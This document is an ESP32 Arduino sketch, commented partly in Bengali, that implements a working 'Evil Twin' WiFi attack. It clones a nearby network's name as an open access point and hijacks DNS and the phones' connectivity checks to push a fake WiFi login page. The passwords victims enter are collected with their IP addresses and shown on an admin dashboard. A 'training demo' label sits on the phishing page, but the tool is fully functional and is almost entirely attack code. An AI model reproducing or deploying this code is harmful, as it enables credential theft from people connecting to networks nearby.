#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>

// ========== সার্ভার ডিক্লারেশন ==========
WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;

// ========== Admin AP সেটিংস ==========
const char* adminSSID = "Unknown";
const char* adminPassword = "Rabbi0606@";

// ========== Evil Twin সেটিংস ==========
bool isEvilTwinActive = false;
String evilTwinSSID = "Free";
int evilTwinChannel = 6;

// ========== নেটওয়ার্ক স্ক্যান (সিম্পল) ==========
String networkSSIDs[30];
int networkChannels[30];
int networkRSSI[30];
int networkCount = 0;

// ========== ক্রেডেনশিয়াল স্টোরেজ (অপ্টিমাইজড) ==========
struct Credential {
    String timestamp;
    String ssid;
    String password;
    String clientIP;
};
Credential capturedCreds[50];
int credCount = 0;

// ========== ইউটিলিটি ফাংশন ==========
String getTimestamp() {
    unsigned long ms = millis();
    int seconds = (ms / 1000) % 60;
    int minutes = (ms / (1000 * 60)) % 60;
    int hours = (ms / (1000 * 60 * 60)) % 24;
    
    char buffer[20];
    sprintf(buffer, "%02d:%02d:%02d", hours, minutes, seconds);
    return String(buffer);
}

// ========== HTML টেম্পলেটস (অপ্টিমাইজড) ==========

// Admin Dashboard HTML - Minimized & Optimized
const char* adminDashboard = R"rawliteral(
<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Evil Twin Trainer</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:15px}
.container{max-width:900px;margin:0 auto}
.card{background:#fff;padding:25px;border-radius:15px;margin-bottom:20px;box-shadow:0 10px 30px rgba(0,0,0,0.2)}
h1{color:#667eea;margin-bottom:20px;text-align:center;font-size:28px}
h2{color:#333;margin-bottom:15px;font-size:20px;border-bottom:3px solid #667eea;padding-bottom:10px}
.btn{padding:12px 24px;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin:5px;transition:all 0.3s}
.btn-primary{background:#667eea;color:#fff}
.btn-primary:hover{background:#5568d3;transform:translateY(-2px)}
.btn-success{background:#10b981;color:#fff}
.btn-success:hover{background:#059669;transform:translateY(-2px)}
.btn-danger{background:#ef4444;color:#fff}
.btn-danger:hover{background:#dc2626;transform:translateY(-2px)}
.btn:disabled{opacity:0.5;cursor:not-allowed}
.form-group{margin-bottom:15px}
.form-group label{display:block;margin-bottom:5px;font-weight:600;color:#333}
.form-control{width:100%;padding:12px;border:2px solid #ddd;border-radius:8px;font-size:15px}
.form-control:focus{outline:none;border-color:#667eea}
.network-list{max-height:350px;overflow-y:auto;margin-top:15px}
.network-item{padding:15px;margin:10px 0;background:#f8f9fa;border-radius:10px;border-left:4px solid #667eea;cursor:pointer;transition:all 0.3s}
.network-item:hover{background:#e9ecef;transform:translateX(5px)}
.network-item.selected{background:#667eea;color:#fff;font-weight:600}
.status{padding:15px;border-radius:10px;margin-bottom:15px;text-align:center;font-weight:600;font-size:16px}
.status.active{background:#d4edda;color:#155724}
.status.twin{background:#fff3cd;color:#856404}
table{width:100%;border-collapse:collapse;margin-top:15px}
table th{background:#667eea;color:#fff;padding:12px;text-align:left}
table td{padding:10px;border-bottom:1px solid #ddd}
table tr:hover{background:#f8f9fa}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-top:15px}
.stat-box{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:20px;border-radius:10px;text-align:center}
.stat-value{font-size:32px;font-weight:800;margin-bottom:5px}
.stat-label{font-size:14px;opacity:0.9}
.loader{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.alert{padding:15px;border-radius:10px;margin:15px 0;border-left:5px solid}
.alert-success{background:#d4edda;border-color:#28a745;color:#155724}
.alert-warning{background:#fff3cd;border-color:#ffc107;color:#856404}
.alert-info{background:#e3f2fd;border-color:#667eea;color:#1565c0}
@media(max-width:768px){
.stats{grid-template-columns:1fr}
.btn{padding:10px 15px;font-size:14px;margin:3px}
h1{font-size:22px}
}
</style>
</head>
<body>
<div class="container">
<div class="card">
<h1>🔐 Evil Twin Trainer (ESP32 Optimized)</h1>
<div class="status active" id="systemStatus">সিস্টেম প্রস্তুত</div>
</div>

<div class="card">
<h2>📶 WiFi Networks</h2>
<button class="btn btn-primary" onclick="scanNetworks()" id="scanBtn">🔍 Scan Networks</button>
<div class="network-list" id="networkList"></div>
</div>

<div class="card">
<h2>👥 Evil Twin Control</h2>
<div class="form-group">
<label>Selected Network:</label>
<input type="text" class="form-control" id="targetNetwork" readonly>
</div>
<div class="form-group">
<label>Evil Twin SSID (or use selected):</label>
<input type="text" class="form-control" id="evilSSID" placeholder="Leave empty to copy selected">
</div>
<div style="text-align:center">
<button class="btn btn-success" id="btnCreate" onclick="createEvilTwin()" disabled>👥 Create Evil Twin</button>
<button class="btn btn-danger" id="btnStop" onclick="stopEvilTwin()" disabled>⏹️ Stop Evil Twin</button>
</div>
<div id="twinStatus"></div>
</div>

<div class="card">
<h2>📊 Statistics</h2>
<div class="stats">
<div class="stat-box">
<div class="stat-value" id="credCount">0</div>
<div class="stat-label">Captured Credentials</div>
</div>
<div class="stat-box">
<div class="stat-value" id="clientCount">0</div>
<div class="stat-label">Connected Clients</div>
</div>
</div>
</div>

<div class="card">
<h2>🔑 Captured Credentials</h2>
<table>
<thead><tr><th>Time</th><th>SSID</th><th>Password</th><th>Client IP</th></tr></thead>
<tbody id="credTable"><tr><td colspan="4" style="text-align:center;color:#999">No credentials captured yet</td></tr></tbody>
</table>
</div>
</div>

<script>
let selectedNetwork=null;

function showAlert(msg,type='info'){
alert(msg);
}

function scanNetworks(){
let list=document.getElementById('networkList');
let btn=document.getElementById('scanBtn');
list.innerHTML='<div class="loader"></div>';
btn.disabled=true;
btn.textContent='⏳ Scanning...';

fetch('/scan')
.then(r=>r.json())
.then(data=>{
list.innerHTML='';
if(data.networks.length===0){
list.innerHTML='<div style="text-align:center;padding:20px;color:#999">No networks found</div>';
}else{
data.networks.forEach(net=>{
let div=document.createElement('div');
div.className='network-item';
div.innerHTML=`<strong>${net.ssid||'Hidden'}</strong><br><small>Ch: ${net.channel} | ${net.rssi} dBm</small>`;
div.onclick=()=>selectNetwork(net,div);
list.appendChild(div);
});
}
btn.disabled=false;
btn.textContent='🔍 Scan Networks';
})
.catch(()=>{
list.innerHTML='<div style="text-align:center;padding:20px;color:red">Scan failed</div>';
btn.disabled=false;
btn.textContent='🔍 Scan Networks';
});
}

function selectNetwork(net,el){
selectedNetwork=net;
document.querySelectorAll('.network-item').forEach(i=>i.classList.remove('selected'));
if(el)el.classList.add('selected');
document.getElementById('targetNetwork').value=net.ssid||'Hidden';
document.getElementById('btnCreate').disabled=false;
}

function createEvilTwin(){
if(!selectedNetwork){showAlert('Please select a network first!');return;}
let ssid=document.getElementById('evilSSID').value||selectedNetwork.ssid;
let ch=selectedNetwork.channel;

fetch(`/createEvilTwin?ssid=${encodeURIComponent(ssid)}&channel=${ch}`)
.then(r=>r.json())
.then(data=>{
if(data.success){
document.getElementById('systemStatus').textContent='👥 Evil Twin Active';
document.getElementById('systemStatus').className='status twin';
document.getElementById('btnCreate').disabled=true;
document.getElementById('btnStop').disabled=false;
document.getElementById('twinStatus').innerHTML=`
<div class="alert alert-success" style="margin-top:15px">
<strong>✅ Evil Twin Created!</strong><br>
SSID: <code>${ssid}</code><br>
Victims auto-redirect to login page<br>
<strong>Access Admin:</strong> <a href="http://192.168.4.1/admin" target="_blank">192.168.4.1/admin</a>
</div>`;
updateStats();
}
});
}

function stopEvilTwin(){
fetch('/stopEvilTwin')
.then(r=>r.json())
.then(data=>{
if(data.success){
document.getElementById('systemStatus').textContent='সিস্টেম প্রস্তুত';
document.getElementById('systemStatus').className='status active';
document.getElementById('btnCreate').disabled=false;
document.getElementById('btnStop').disabled=true;
document.getElementById('twinStatus').innerHTML='';
}
});
}

function updateStats(){
fetch('/getStats')
.then(r=>r.json())
.then(data=>{
document.getElementById('credCount').textContent=data.credentials;
document.getElementById('clientCount').textContent=data.clients;
});

fetch('/getCredentials')
.then(r=>r.json())
.then(data=>{
let tbody=document.getElementById('credTable');
tbody.innerHTML='';
if(data.length===0){
tbody.innerHTML='<tr><td colspan="4" style="text-align:center;color:#999">No credentials captured yet</td></tr>';
return;
}
data.forEach(c=>{
let row=tbody.insertRow();
row.insertCell(0).textContent=c.timestamp;
row.insertCell(1).innerHTML=`<strong style="color:#667eea">${c.ssid}</strong>`;
row.insertCell(2).innerHTML=`<code style="background:#ffebee;padding:4px 8px;border-radius:4px">${c.password}</code>`;
row.insertCell(3).textContent=c.clientIP;
});
});
}

setInterval(()=>{
let status=document.getElementById('systemStatus').className;
if(status.includes('twin')){
updateStats();
}
},3000);

window.onload=function(){
scanNetworks();
};
</script>
</body>
</html>
)rawliteral";

// Evil Twin Login Page (Captive Portal) - Optimized
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>WiFi Login Required</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.login-box{background:#fff;padding:40px;border-radius:15px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:400px;width:100%;text-align:center}
.icon{font-size:60px;margin-bottom:20px}
h2{color:#333;margin-bottom:15px}
.network-name{color:#667eea;font-weight:700;font-size:22px;margin:20px 0;padding:15px;background:#f8f9fa;border-radius:10px}
input{width:100%;padding:15px;margin:10px 0;border:2px solid #ddd;border-radius:8px;font-size:16px}
input:focus{outline:none;border-color:#667eea}
button{width:100%;padding:15px;background:#667eea;color:#fff;border:none;border-radius:8px;font-size:18px;font-weight:700;cursor:pointer;margin-top:15px}
button:hover{background:#5568d3}
.note{margin-top:25px;padding:20px;background:#fff3cd;border:2px solid #ffc107;border-radius:10px;color:#856404;font-size:14px;text-align:left}
</style>
</head>
<body>
<div class="login-box">
<div class="icon">🔐</div>
<h2>WiFi Authentication Required</h2>
<p>Please enter password to connect</p>
<div class="network-name" id="networkName">Loading...</div>
<form id="loginForm">
<input type="password" placeholder="WiFi Password" id="password" required>
<button type="submit">Connect to WiFi</button>
</form>
<div class="note">
<strong>⚠️ TRAINING DEMO</strong><br><br>
This is an educational demonstration.<br>
Never enter credentials on unfamiliar networks.
</div>
</div>

<script>
fetch('/getNetwork')
.then(r=>r.json())
.then(data=>{
document.getElementById('networkName').textContent=data.ssid;
});

document.getElementById('loginForm').onsubmit=async function(e){
e.preventDefault();
let password=document.getElementById('password').value;
let ssid=document.getElementById('networkName').textContent;

let formData=new FormData();
formData.append('ssid',ssid);
formData.append('password',password);

await fetch('/login',{method:'POST',body:formData});

document.body.innerHTML=`
<div class="login-box">
<div class="icon" style="color:#10b981">✅</div>
<h2>Connection Successful!</h2>
<p style="margin-top:20px">You are now connected to the WiFi network.</p>
<div class="note" style="background:#d4edda;border-color:#10b981;color:#155724">
<strong>🎓 TRAINING COMPLETE!</strong><br><br>
You have completed the WiFi security training.<br>
Always verify networks before connecting.
</div>
</div>`;
};
</script>
</body>
</html>
)rawliteral";

// ========== ফাংশন ডেফিনিশন ==========

// নেটওয়ার্ক স্ক্যান (Optimized)
void scanNetworks() {
    Serial.println("\n[SCAN] Scanning WiFi networks...");
    
    WiFi.mode(WIFI_AP_STA);
    delay(50);
    
    int n = WiFi.scanNetworks(false, false, false, 300);
    networkCount = min(n, 30);
    
    Serial.printf("[SCAN] Found %d networks\n", networkCount);
    
    for(int i = 0; i < networkCount; i++) {
        networkSSIDs[i] = WiFi.SSID(i);
        networkChannels[i] = WiFi.channel(i);
        networkRSSI[i] = WiFi.RSSI(i);
        
        Serial.printf("  %2d. %-32s Ch:%2d RSSI:%3d\n",
                     i+1, networkSSIDs[i].c_str(),
                     networkChannels[i], networkRSSI[i]);
    }
    
    WiFi.scanDelete();
    WiFi.mode(WIFI_AP);
}

// Evil Twin AP তৈরি (Optimized)
void createEvilTwinAP(String ssid, int channel) {
    Serial.println("\n[EVIL TWIN] Creating Evil Twin AP...");
    
    // Configure Evil Twin AP
    bool success = WiFi.softAP(ssid.c_str(), nullptr, channel, 0, 8);
    
    if(success) {
        isEvilTwinActive = true;
        evilTwinSSID = ssid;
        evilTwinChannel = channel;
        
        // Start DNS Server for captive portal
        dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
        
        Serial.println("[EVIL TWIN] ✅ Created successfully!");
        Serial.printf("  SSID: %s (Open - No Password)\n", ssid.c_str());
        Serial.printf("  Channel: %d\n", channel);
        Serial.printf("  IP: %s\n", WiFi.softAPIP().toString().c_str());
        Serial.println("  📱 Victims: http://192.168.4.1");
        Serial.println("  🔐 Admin: http://192.168.4.1/admin");
    } else {
        Serial.println("[EVIL TWIN] ❌ Failed to create AP");
    }
}

// ========== সার্ভার রাউটস (Optimized) ==========

void setupServer() {
    // মূল পেজ - root route
    server.on("/", HTTP_GET, []() {
        if(server.uri() == "/admin" || server.hasArg("admin")) {
            server.send(200, "text/html", adminDashboard);
        } else if(isEvilTwinActive) {
            server.send(200, "text/html", loginPage);
        } else {
            server.send(200, "text/html", adminDashboard);
        }
    });
    
    // Admin panel
    server.on("/admin", HTTP_GET, []() {
        server.send(200, "text/html", adminDashboard);
    });
    
    // Captive portal detection
    server.on("/generate_204", HTTP_GET, []() {
        server.send(200, "text/html", loginPage);
    });
    
    server.on("/hotspot-detect.html", HTTP_GET, []() {
        server.send(200, "text/html", loginPage);
    });
    
    server.on("/connecttest.txt", HTTP_GET, []() {
        server.send(200, "text/html", loginPage);
    });
    
    // Network scan
    server.on("/scan", HTTP_GET, []() {
        scanNetworks();
        
        DynamicJsonDocument doc(3072);
        JsonArray networks = doc.createNestedArray("networks");
        
        for(int i = 0; i < networkCount; i++) {
            JsonObject network = networks.createNestedObject();
            network["ssid"] = networkSSIDs[i];
            network["channel"] = networkChannels[i];
            network["rssi"] = networkRSSI[i];
        }
        
        String json;
        serializeJson(doc, json);
        server.send(200, "application/json", json);
    });
    
    // Create Evil Twin
    server.on("/createEvilTwin", HTTP_GET, []() {
        String ssid = server.arg("ssid");
        int channel = server.arg("channel").toInt();
        
        createEvilTwinAP(ssid, channel);
        
        String response = "{\"success\":true}";
        server.send(200, "application/json", response);
    });
    
    // Stop Evil Twin
    server.on("/stopEvilTwin", HTTP_GET, []() {
        if(isEvilTwinActive) {
            dnsServer.stop();
            WiFi.softAPdisconnect(false);
            delay(100);
            WiFi.softAP(adminSSID, adminPassword);
            isEvilTwinActive = false;
            Serial.println("\n[EVIL TWIN] Stopped, Admin AP restored");
        }
        
        server.send(200, "application/json", "{\"success\":true}");
    });
    
    // Get network info
    server.on("/getNetwork", HTTP_GET, []() {
        String json = "{\"ssid\":\"" + evilTwinSSID + "\"}";
        server.send(200, "application/json", json);
    });
    
    // Login handler (capture credentials)
    server.on("/login", HTTP_POST, []() {
        String ssid = evilTwinSSID;
        String password = server.arg("password");
        String clientIP = server.client().remoteIP().toString();
        
        if(credCount < 50) {
            capturedCreds[credCount].timestamp = getTimestamp();
            capturedCreds[credCount].ssid = ssid;
            capturedCreds[credCount].password = password;
            capturedCreds[credCount].clientIP = clientIP;
            credCount++;
            
            Serial.println("\n[CREDENTIAL] 📧 Captured!");
            Serial.printf("  Time: %s\n", capturedCreds[credCount-1].timestamp.c_str());
            Serial.printf("  SSID: %s\n", ssid.c_str());
            Serial.printf("  Password: %s\n", password.c_str());
            Serial.printf("  Client IP: %s\n", clientIP.c_str());
        }
        
        server.send(200, "text/html", "OK");
    });
    
    // Get statistics
    server.on("/getStats", HTTP_GET, []() {
        StaticJsonDocument<256> doc;
        doc["credentials"] = credCount;
        doc["clients"] = WiFi.softAPgetStationNum();
        doc["uptime"] = millis() / 1000;
        doc["freeHeap"] = ESP.getFreeHeap();
        
        String json;
        serializeJson(doc, json);
        server.send(200, "application/json", json);
    });
    
    // Get credentials
    server.on("/getCredentials", HTTP_GET, []() {
        DynamicJsonDocument doc(2048);
        JsonArray creds = doc.to<JsonArray>();
        
        for(int i = 0; i < credCount; i++) {
            JsonObject cred = creds.createNestedObject();
            cred["timestamp"] = capturedCreds[i].timestamp;
            cred["ssid"] = capturedCreds[i].ssid;
            cred["password"] = capturedCreds[i].password;
            cred["clientIP"] = capturedCreds[i].clientIP;
        }
        
        String json;
        serializeJson(doc, json);
        server.send(200, "application/json", json);
    });
    
    // 404 handler - redirect to captive portal
    server.onNotFound([]() {
        if(isEvilTwinActive) {
            server.send(200, "text/html", loginPage);
        } else {
            server.send(404, "text/plain", "Not Found");
        }
    });
    
    server.begin();
}

// ========== SETUP ফাংশন ==========

void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n\n╔══════════════════════════════════════════╗");
    Serial.println("║   ESP32 EVIL TWIN TRAINER (OPTIMIZED)   ║");
    Serial.println("║   Version 4.0 - Evil Twin Only           ║");
    Serial.println("╚══════════════════════════════════════════╝");
    
    // WiFi কনফিগারেশন
    WiFi.mode(WIFI_AP);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);  // Max power
    
    // Admin AP তৈরি
    WiFi.softAP(adminSSID, adminPassword);
    
    Serial.println("\n✅ ADMIN ACCESS POINT CREATED");
    Serial.printf("   SSID: %s\n", adminSSID);
    Serial.printf("   Password: %s\n", adminPassword);
    Serial.printf("   IP: %s\n", WiFi.softAPIP().toString().c_str());
    
    // সার্ভার সেটআপ
    setupServer();
    
    Serial.println("\n🌐 WEB SERVER STARTED");
    Serial.println("   Dashboard: http://" + WiFi.softAPIP().toString());
    
    // প্রাথমিক স্ক্যান
    scanNetworks();
    
    Serial.println("\n🚀 SYSTEM READY");
    Serial.println("   Connect: " + String(adminSSID));
    Serial.println("   Browser: http://192.168.4.1");
    Serial.println("\n╔══════════════════════════════════════════╗");
    Serial.println("║   EVIL TWIN TRAINER ACTIVE              ║");
    Serial.println("╚══════════════════════════════════════════╝\n");
}

// ========== LOOP ফাংশন (Optimized) ==========

void loop() {
    // Handle web requests
    server.handleClient();
    
    // Handle DNS requests (captive portal)
    if(isEvilTwinActive) {
        dnsServer.processNextRequest();
    }
    
    // Memory check (every 30 seconds)
    static unsigned long lastMemCheck = 0;
    if(millis() - lastMemCheck > 30000) {
        uint32_t freeHeap = ESP.getFreeHeap();
        Serial.printf("[MEM] Free: %d bytes | Clients: %d\n", 
                     freeHeap, WiFi.softAPgetStationNum());
        lastMemCheck = millis();
    }
    
    delay(1);
}
